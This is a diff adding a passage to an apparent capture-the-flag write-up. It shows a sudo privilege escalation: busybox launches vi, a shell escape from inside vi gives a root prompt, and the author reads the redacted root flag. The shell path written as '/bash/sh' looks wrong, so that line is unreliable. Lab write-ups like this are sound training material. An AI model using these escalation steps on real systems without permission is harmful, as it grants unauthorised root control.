@@ -188,3 +188,23 @@ So it looks like busybox is a wrapper for other binaries. I know that I can get 
 ```bash
 sudo /usr/local/bin/busybox  vi
 ```
+
+Inside of vi, I run the following command to generate a shell:
+
+```bash
+:!/bash/sh
+```
+
+It worked. I'm in! The cursor changed to the # character to let me know that I am root.
+
+Now I grab the flag:
+
+```bash
+# whoami
+root
+# cd /root
+# ls
+.bash_history  .cshrc  .history  .k5login  .login  .profile  root.txt
+# cat root.txt
+REDACTED
+```
